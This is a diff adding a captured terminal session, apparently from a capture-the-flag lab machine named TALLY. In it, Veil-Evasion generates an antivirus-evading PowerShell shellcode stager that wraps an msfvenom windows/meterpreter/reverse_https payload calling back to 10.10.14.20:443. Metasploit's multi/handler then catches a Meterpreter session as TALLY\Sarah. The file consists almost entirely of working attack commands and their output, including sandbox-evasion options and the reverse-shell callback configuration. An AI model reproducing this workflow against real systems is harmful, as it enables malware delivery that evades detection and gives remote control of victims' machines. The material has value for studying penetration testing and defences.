@@ -1,0 +1,264 @@
+===============================================================================
+                                   Veil-Evasion
+===============================================================================
+      [Web]: https://www.veil-framework.com/ | [Twitter]: @VeilFramework
+===============================================================================
+
+Veil-Evasion Menu
+
+	41 payloads loaded
+
+Available Commands:
+
+	back			Go to Veil's main menu
+	checkvt			Check VirusTotal.com against generated hashes
+	clean			Remove generated artifacts
+	exit			Completely exit Veil
+	info			Information on a specific payload
+	list			List available payloads
+	use			Use a specific payload
+
+Veil/Evasion>: list
+===============================================================================
+                                   Veil-Evasion
+===============================================================================
+      [Web]: https://www.veil-framework.com/ | [Twitter]: @VeilFramework
+===============================================================================
+
+
+ [*] Available Payloads:
+
+	1)	autoit/shellcode_inject/flat.py
+
+	2)	auxiliary/coldwar_wrapper.py
+	3)	auxiliary/macro_converter.py
+	4)	auxiliary/pyinstaller_wrapper.py
+
+	5)	c/meterpreter/rev_http.py
+	6)	c/meterpreter/rev_http_service.py
+	7)	c/meterpreter/rev_tcp.py
+	8)	c/meterpreter/rev_tcp_service.py
+
+	9)	cs/meterpreter/rev_http.py
+	10)	cs/meterpreter/rev_https.py
+	11)	cs/meterpreter/rev_tcp.py
+	12)	cs/shellcode_inject/base64.py
+	13)	cs/shellcode_inject/virtual.py
+
+	14)	go/meterpreter/rev_http.py
+	15)	go/meterpreter/rev_https.py
+	16)	go/meterpreter/rev_tcp.py
+	17)	go/shellcode_inject/virtual.py
+
+	18)	lua/shellcode_inject/flat.py
+
+	19)	perl/shellcode_inject/flat.py
+
+	20)	powershell/meterpreter/rev_http.py
+	21)	powershell/meterpreter/rev_https.py
+	22)	powershell/meterpreter/rev_tcp.py
+	23)	powershell/shellcode_inject/psexec_virtual.py
+	24)	powershell/shellcode_inject/virtual.py
+
+	25)	python/meterpreter/bind_tcp.py
+	26)	python/meterpreter/rev_http.py
+	27)	python/meterpreter/rev_https.py
+	28)	python/meterpreter/rev_tcp.py
+	29)	python/shellcode_inject/aes_encrypt.py
+	30)	python/shellcode_inject/arc_encrypt.py
+	31)	python/shellcode_inject/base64_substitution.py
+	32)	python/shellcode_inject/des_encrypt.py
+	33)	python/shellcode_inject/flat.py
+	34)	python/shellcode_inject/letter_substitution.py
+	35)	python/shellcode_inject/pidinject.py
+	36)	python/shellcode_inject/stallion.py
+
+	37)	ruby/meterpreter/rev_http.py
+	38)	ruby/meterpreter/rev_https.py
+	39)	ruby/meterpreter/rev_tcp.py
+	40)	ruby/shellcode_inject/base64.py
+	41)	ruby/shellcode_inject/flat.py
+
+
+Veil/Evasion>: use 24
+===============================================================================
+                                   Veil-Evasion
+===============================================================================
+      [Web]: https://www.veil-framework.com/ | [Twitter]: @VeilFramework
+===============================================================================
+
+ Payload Information:
+
+	Name:		PowerShell Flat Stager
+	Language:	powershell
+	Rating:		Excellent
+	Description:    PowerShell VirtualAlloc method for inline
+	                shellcode injection
+
+Payload: powershell/shellcode_inject/virtual selected
+
+ Required Options:
+
+Name            	Value   	Description
+----            	-----   	-----------
+BADMACS         	FALSE   	Checks for known bad mac addresses
+DOMAIN          	X       	Optional: Required internal domain
+HOSTNAME        	X       	Optional: Required system hostname
+INJECT_METHOD   	Virtual 	Virtual, Void, or Heap
+MINBROWSERS     	FALSE   	Minimum of 2 browsers
+MINPROCESSES    	X       	Minimum number of processes running
+MINRAM          	FALSE   	Require a minimum of 3 gigs of RAM
+PROCESSORS      	X       	Optional: Minimum number of processors
+SLEEP           	X       	Optional: Sleep "Y" seconds, check if accelerated
+USERNAME        	X       	Optional: The required user account
+USERPROMPT      	FALSE   	Window pops up prior to payload
+UTCCHECK        	FALSE   	Check that system isn't using UTC time zone
+VIRTUALPROC     	FALSE   	Check for known VM processes
+
+ Available Commands:
+
+	back        	Go back to Veil-Evasion
+	exit        	Completely exit Veil
+	generate    	Generate the payload
+	options     	Show the shellcode's options
+	set         	Set shellcode option
+
+[powershell/shellcode_inject/virtual>>]: generate
+
+ [?] Generate or supply custom shellcode?
+
+     1 - Ordnance (default)
+     2 - MSFVenom
+     3 - Custom shellcode string
+     4 - File with shellcode (\x41\x42..)
+     5 - Binary file with shellcode
+
+ [>] Please enter the number of your choice: 2
+
+ [*] Press [enter] for windows/meterpreter/reverse_tcp
+ [*] Press [tab] to list available payloads
+ [>] Please enter metasploit payload: windows/meterpreter/reverse_https
+ [>] Enter value for 'LHOST', [tab] for local IP: 10.10.14.20
+ [>] Enter value for 'LPORT': 443
+ [>] Enter any extra msfvenom options (syntax: OPTION1=value1 or -OPTION2=value2): 
+
+ [*] Generating shellcode using msfvenom...
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder specified, outputting raw payload
+Payload size: 564 bytes
+Final size of c file: 2394 bytes
+===============================================================================
+                                   Veil-Evasion
+===============================================================================
+      [Web]: https://www.veil-framework.com/ | [Twitter]: @VeilFramework
+===============================================================================
+
+ [>] Please enter the base name for output files (default is payload): 
+===============================================================================
+                                   Veil-Evasion
+===============================================================================
+      [Web]: https://www.veil-framework.com/ | [Twitter]: @VeilFramework
+===============================================================================
+
+ [*] Language: powershell
+ [*] Payload Module: powershell/shellcode_inject/virtual
+ [*] PowerShell doesn't compile, so you just get text :)
+ [*] Source code written to: /var/lib/veil/output/source/payload.bat
+ [*] Metasploit Resource file written to: /var/lib/veil/output/handlers/payload.rc
+
+Hit enter to continue...
+===============================================================================
+                                   Veil-Evasion
+===============================================================================
+      [Web]: https://www.veil-framework.com/ | [Twitter]: @VeilFramework
+===============================================================================
+
+Veil-Evasion Menu
+
+	41 payloads loaded
+
+Available Commands:
+
+	back			Go to Veil's main menu
+	checkvt			Check VirusTotal.com against generated hashes
+	clean			Remove generated artifacts
+	exit			Completely exit Veil
+	info			Information on a specific payload
+	list			List available payloads
+	use			Use a specific payload
+
+Veil/Evasion>: exit
+
+
+..
+..
+..
+
+┌─[root@parrot-virtual]─[/opt/Veil]
+└──╼ #msfconsole -r /var/lib/veil/output/handlers/payload.rc
+                                                  
+  +-------------------------------------------------------+
+  |  METASPLOIT by Rapid7                                 |
+  +---------------------------+---------------------------+
+  |      __________________   |                           |
+  |  ==c(______(o(______(_()  | |""""""""""""|======[***  |
+  |             )=\           | |  EXPLOIT   \            |
+  |            // \\          | |_____________\_______    |
+  |           //   \\         | |==[msf >]============\   |
+  |          //     \\        | |______________________\  |
+  |         // RECON \\       | \(@)(@)(@)(@)(@)(@)(@)/   |
+  |        //         \\      |  *********************    |
+  +---------------------------+---------------------------+
+  |      o O o                |        \'\/\/\/'/         |
+  |              o O          |         )======(          |
+  |                 o         |       .'  LOOT  '.        |
+  | |^^^^^^^^^^^^^^|l___      |      /    _||__   \       |
+  | |    PAYLOAD     |""\___, |     /    (_||_     \      |
+  | |________________|__|)__| |    |     __||_)     |     |
+  | |(@)(@)"""**|(@)(@)**|(@) |    "       ||       "     |
+  |  = = = = = = = = = = = =  |     '--------------'      |
+  +---------------------------+---------------------------+
+
+
+       =[ metasploit v6.0.44-dev                          ]
++ -- --=[ 2131 exploits - 1139 auxiliary - 363 post       ]
++ -- --=[ 596 payloads - 45 encoders - 10 nops            ]
++ -- --=[ 8 evasion                                       ]
+
+Metasploit tip: View a module's description using 
+info, or the enhanced version in your browser with 
+info -d
+
+[*] Processing /var/lib/veil/output/handlers/payload.rc for ERB directives.
+resource (/var/lib/veil/output/handlers/payload.rc)> use exploit/multi/handler
+[*] Using configured payload generic/shell_reverse_tcp
+resource (/var/lib/veil/output/handlers/payload.rc)> set PAYLOAD windows/meterpreter/reverse_https
+PAYLOAD => windows/meterpreter/reverse_https
+resource (/var/lib/veil/output/handlers/payload.rc)> set LHOST 10.10.14.20
+LHOST => 10.10.14.20
+resource (/var/lib/veil/output/handlers/payload.rc)> set LPORT 443
+LPORT => 443
+resource (/var/lib/veil/output/handlers/payload.rc)> set ExitOnSession false
+ExitOnSession => false
+resource (/var/lib/veil/output/handlers/payload.rc)> exploit -j
+[*] Exploit running as background job 0.
+[*] Exploit completed, but no session was created.
+msf6 exploit(multi/handler) > 
+[*] Started HTTPS reverse handler on https://10.10.14.20:443
+
+msf6 exploit(multi/handler) > 
+[!] https://10.10.14.20:443 handling request from 10.10.10.59; (UUID: nsrvvqqe) Without a database connected that payload UUID tracking will not work!
+[*] https://10.10.14.20:443 handling request from 10.10.10.59; (UUID: nsrvvqqe) Staging x86 payload (176220 bytes) ...
+[!] https://10.10.14.20:443 handling request from 10.10.10.59; (UUID: nsrvvqqe) Without a database connected that payload UUID tracking will not work!
+[*] Meterpreter session 1 opened (10.10.14.20:443 -> 127.0.0.1) at 2021-05-25 18:19:49 -0700
+
+msf6 exploit(multi/handler) > sessions -l
+
+Active sessions
+===============
+
+  Id  Name  Type                     Information          Connection
+  --  ----  ----                     -----------          ----------
+  1         meterpreter x86/windows  TALLY\Sarah @ TALLY  10.10.14.20:443 -> 127.0.0.1 (10.10.10.59)
+
